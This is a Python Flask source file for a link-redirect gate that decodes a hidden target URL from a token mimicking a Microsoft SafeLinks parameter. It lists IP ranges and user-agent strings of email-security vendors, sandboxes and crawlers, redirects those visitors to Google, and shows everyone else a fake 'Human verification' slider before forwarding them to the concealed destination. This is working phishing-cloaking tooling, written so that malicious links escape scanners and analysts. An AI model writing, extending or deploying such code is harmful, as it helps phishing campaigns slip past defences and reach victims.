import os
import time
import json
import secrets
import base64
import logging
from ipaddress import ip_address, ip_network
from urllib.parse import quote

from flask import (
    Flask, request, redirect, render_template_string,
    make_response, jsonify,
)
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired

# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------
SK = os.environ.get("SECRET_KEY", "7b311b50f8306ae1fbe13f4db9b030267f77f3cc0020889b8cb583895afb443e")
GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.google.com")

app = Flask(__name__)
app.secret_key = SK.encode()
cookie_serializer = URLSafeTimedSerializer(app.secret_key, salt="cookie-gate")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("link-gate")

# ---------------------------------------------------------------------------
# scanner networks & UAs (Kept full for your blocklist)
# ---------------------------------------------------------------------------
EOP = [
    ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"),
    ip_network("52.100.0.0/14"), ip_network("104.47.0.0/17"),
    ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"),
    ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20"),
]
PROOFPOINT = [
    ip_network("148.163.0.0/16"), ip_network("67.231.144.0/20"),
    ip_network("185.132.40.0/22"), ip_network("185.132.44.0/22"),
    ip_network("194.154.77.0/24"), ip_network("195.245.230.0/23"),
    ip_network("62.128.218.0/23"),
    ip_network("217.146.94.0/23"), ip_network("217.146.96.0/20"),
]
MIMECAST = [ip_network("207.211.30.0/23"), ip_network("91.220.42.0/24")]
BARRACUDA = [ip_network("64.235.144.0/20"), ip_network("209.240.128.0/19")]
TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
GOOGLE_SAFEBROWSING = [ip_network("66.249.64.0/19"), ip_network("2001:4860::/32")]

SCANNER_NETS = {
    "microsoft_eop": EOP, "proofpoint": PROOFPOINT, "mimecast": MIMECAST,
    "barracuda": BARRACUDA, "cisco_talos": TALOS, "google_safebrowsing": GOOGLE_SAFEBROWSING,
    "abnormal": [ip_network("199.255.200.0/22"), ip_network("192.30.44.0/22")],
    "avanan": [ip_network("52.5.0.0/16"), ip_network("52.20.0.0/14"), ip_network("34.192.0.0/12")],
    "ironscales": [ip_network("104.196.0.0/14"), ip_network("35.184.0.0/13")],
    "cloudflare_email": [ip_network("104.30.0.0/18")],
    "zscaler": [ip_network("104.129.192.0/20"), ip_network("165.225.0.0/17")],
    "forcepoint": [ip_network("157.238.0.0/16"), ip_network("209.104.0.0/20")],
}

SCANNER_UA_TOKENS = (
    "microsoft office", "safelinks", "microsoft preview", "proofpoint", "pp-url", "mimecast",
    "barracuda", "talos", "ironport", "forcepoint", "symantec", "messagelabs", "trendmicro",
    "trend micro", "kaspersky", "sophos", "fireeye", "mandiant", "abnormal security", "avanan",
    "ironscales", "cloudmark", "agari", "valimail", "hornetsecurity", "spamhaus", "zerospam",
    "retarus", "vade", "urlscan", "urlscan.io", "virustotal", "any.run", "hybrid-analysis",
    "joesandbox", "joe sandbox", "cuckoo", "triage", "hatching", "intezer", "cape sandbox",
    "reverse.it", "filescan.io", "googlebot", "google-safety", "bingpreview", "bingbot",
    "duckduckbot", "yandexbot", "baiduspider", "slackbot", "twitterbot", "facebookexternalhit",
    "linkedinbot", "discordbot", "telegrambot", "whatsapp", "skypeuripreview", "applebot",
    "pinterestbot", "embedly", "quora link preview", "outbrain", "nuzzel", "vk share",
    "w3c_validator", "curl/", "wget/", "python-requests", "python-urllib", "go-http-client",
    "java/", "okhttp", "axios/", "node-fetch", "undici", "libwww-perl", "masscan", "nmap",
    "zgrab", "nuclei", "nikto", "sqlmap", "headlesschrome", "phantomjs", "puppeteer", "playwright",
    "lighthouse", "pagespeed", "gtmetrix", "pingdom", "uptimerobot", "statuscake", "site24x7",
    "newrelic", "datadog synthetics",
)

ALLOWLIST_IPS = []
ALLOWLIST_UA = ()

def client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    return xff.split(",")[0].strip() if xff else request.remote_addr or ""

def classify(ip: str, ua: str) -> dict:
    out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
    low = ua.lower()
    
    if any(tok in low for tok in ALLOWLIST_UA):
        out["source"] = "allowlist_ua"
        return out
        
    try:
        a = ip_address(ip)
    except ValueError:
        a = None
        
    if a is not None:
        if any(a in n for n in ALLOWLIST_IPS):
            out["source"] = "allowlist_ip"
            return out
            
        for name, nets in SCANNER_NETS.items():
            if any(a in n for n in nets):
                out["scanner"] = True
                out["source"] = name
                out["method"] = "ip"
                return out
                
    if not out["scanner"]:
        for tok in SCANNER_UA_TOKENS:
            if tok in low:
                out["scanner"] = True
                out["source"] = tok
                out["method"] = "ua"
                return out
                
    return out

def parse_payload_from_eop(eop_string):
    if not eop_string.startswith("u001."): return None
    try:
        clean = eop_string[5:].replace("-3D-3D", "").replace("-2F", "").replace("-3D", "").replace("-3A", "").replace("-2B", "")
        b64_payload = clean.split("-")[-1]
        padding = '=' * (-len(b64_payload) % 4)
        return json.loads(base64.urlsafe_b64decode(b64_payload + padding).decode('utf-8'))
    except Exception as e:
        log.error(f"Failed to parse payload: {e}")
        return None

def _static_page(title: str, text: str, status_code: int):
    html = f"<html><body><h1>{title}</h1><p>{text}</p></body></html>"
    return make_response(html, status_code)

# ---------------------------------------------------------------------------
# THE NEW HUMAN VERIFICATION LANDING PAGE
# ---------------------------------------------------------------------------
LANDING = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Human verification</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f4f8;
            color: #1a202c;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .card {
            background: #ffffff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.05), 0 10px 15px rgba(0,0,0,0.1);
            text-align: center;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
        }
        h1 {
            font-size: 22px;
            margin-top: 0;
            margin-bottom: 10px;
            font-weight: 600;
        }
        p {
            font-size: 14px;
            color: #718096;
            margin-bottom: 30px;
        }
        .slider-container {
            position: relative;
            width: 100%;
            height: 50px;
            background-color: #edf2f7;
            border-radius: 25px;
            display: flex;
            align-items: center;
            user-select: none;
            overflow: hidden;
        }
        .slider-text {
            position: absolute;
            width: 100%;
            text-align: center;
            font-size: 14px;
            color: #a0aec0;
            pointer-events: none;
            transition: opacity 0.3s;
        }
        .slider-handle {
            position: absolute;
            left: 5px;
            width: 40px;
            height: 40px;
            background-color: #ffffff;
            border-radius: 50%;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: grab;
            transition: transform 0.1s;
        }
        .slider-handle:active {
            cursor: grabbing;
        }
        .slider-handle svg {
            width: 16px;
            height: 16px;
            fill: #a0aec0;
        }
        .slider-progress {
            position: absolute;
            left: 0;
            top: 0;
            height: 100%;
            background-color: #c6f6d5;
            width: 0%;
            border-radius: 25px;
        }
        .success-text {
            display: none;
            color: #48bb78;
            font-weight: bold;
            text-align: center;
            width: 100%;
            position: absolute;
        }
    </style>
</head>
<body>

    <div class="card">
        <h1>Human verification</h1>
        <p>Prove you're not a bot by sliding the handle.</p>
        
        <div class="slider-container" id="slider-container">
            <div class="slider-progress" id="slider-progress"></div>
            <span class="slider-text" id="slider-text">Drag to complete</span>
            <span class="success-text" id="success-text">Verified</span>
            <div class="slider-handle" id="slider-handle">
                <svg viewBox="0 0 24 24"><path d="M9 18l6-6-6-6v12z"/></svg>
            </div>
        </div>

        <!-- Hidden form that submits to Flask -->
        <form id="challenge-form" method="POST" action="{{ action }}" style="display:none;">
            <input type="hidden" name="n" value="{{ nonce }}">
            <input type="hidden" name="t" value="{{ token }}">
        </form>
    </div>

    <script>
        const container = document.getElementById('slider-container');
        const handle = document.getElementById('slider-handle');
        const progress = document.getElementById('slider-progress');
        const text = document.getElementById('slider-text');
        const successText = document.getElementById('success-text');
        const form = document.getElementById('challenge-form');

        let isDragging = false;
        let startX = 0;
        let maxDelta = 0;

        function init() {
            maxDelta = container.offsetWidth - handle.offsetWidth - 10; // 5px padding on each side
        }

        window.onload = init;
        window.onresize = init;

        handle.addEventListener('mousedown', startDrag);
        handle.addEventListener('touchstart', startDrag, {passive: true});
        
        document.addEventListener('mousemove', onDrag);
        document.addEventListener('touchmove', onDrag, {passive: false});
        
        document.addEventListener('mouseup', endDrag);
        document.addEventListener('touchend', endDrag);

        function startDrag(e) {
            isDragging = true;
            startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
        }

        function onDrag(e) {
            if (!isDragging) return;
            if (e.cancelable) e.preventDefault();
            
            const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
            let deltaX = clientX - startX;
            
            if (deltaX < 0) deltaX = 0;
            if (deltaX > maxDelta) deltaX = maxDelta;
            
            handle.style.left = (5 + deltaX) + 'px';
            progress.style.width = ((deltaX + 40) / container.offsetWidth * 100) + '%';
            
            if (deltaX >= maxDelta - 2) {
                completeVerification();
            }
        }

        function endDrag() {
            if (!isDragging) return;
            isDragging = false;
            
            if (parseInt(handle.style.left) < maxDelta) {
                // Snap back if not complete
                handle.style.transition = 'left 0.3s ease';
                progress.style.transition = 'width 0.3s ease';
                handle.style.left = '5px';
                progress.style.width = '0%';
                setTimeout(() => {
                    handle.style.transition = '';
                    progress.style.transition = '';
                }, 300);
            }
        }

        function completeVerification() {
            isDragging = false;
            handle.style.background = '#48bb78';
            handle.innerHTML = '<svg style="fill:white" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
            handle.style.cursor = 'default';
            text.style.opacity = '0';
            successText.style.display = 'block';
            
            // Submit the form to trigger the redirect
            setTimeout(function() {
                form.submit();
            }, 500);
        }
    </script>
</body>
</html>"""

# ---------------------------------------------------------------------------
# routes
# ---------------------------------------------------------------------------
@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "ts": int(time.time())})

@app.route("/", methods=["GET"])
def root():
    return _static_page("Not found", "Nothing here.", 404)

@app.route("/ls/<path:token>", methods=["GET"])
def landing(token: str):
    if not token.startswith("click_upn="):
        return _static_page("Invalid link", "This link is not valid.", 404)
        
    eop_token = token.replace("click_upn=", "")
    data = parse_payload_from_eop(eop_token)
    
    if not data or "target" not in data:
        return _static_page("Invalid link", "Could not parse target.", 404)

    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    log.info(json.dumps({"event": "landing_get", **tag}))

    if tag["scanner"]:
        unwanted = data.get("unwanted", UNWANTED_REDIRECT_URL)
        log.info(json.dumps({"event": "landing_scanner_redirect", **tag, "to": unwanted}))
        return redirect(unwanted, code=302)

    nonce_payload = {"t": eop_token, "ts": time.time()}
    nonce_blob = cookie_serializer.dumps(nonce_payload)

    html = render_template_string(LANDING, action=f"/submit/{quote(eop_token)}", token=eop_token, nonce=nonce_blob)
    resp = make_response(html)
    
    is_https = (request.headers.get("X-Forwarded-Proto", "http") == "https" or request.is_secure)
    resp.set_cookie("gate_session", nonce_blob, max_age=GATE_TTL, httponly=True, secure=is_https, samesite="None", path="/")
    return resp

@app.route("/submit/<path:token>", methods=["POST"])
def execute(token: str):
    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    if tag["scanner"]:
        return redirect(UNWANTED_REDIRECT_URL, code=302)

    submitted_blob = request.form.get("n", "")
    if not submitted_blob:
        return _static_page("Missing Context", "Verification payload missing.", 400)

    try:
        nonce_data = cookie_serializer.loads(submitted_blob, max_age=GATE_TTL)
    except:
        return _static_page("Session Expired", "Verification context expired.", 400)

    if not secrets.compare_digest(nonce_data.get("t", ""), token):
        return _static_page("Verification Failed", "Verification payload mismatched.", 400)

    data = parse_payload_from_eop(token)
    if not data or "target" not in data:
         return _static_page("Invalid link", "Could not parse target.", 404)

    resp = make_response(redirect(data["target"], code=303))
    resp.delete_cookie("gate_session", path="/")
    return resp

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
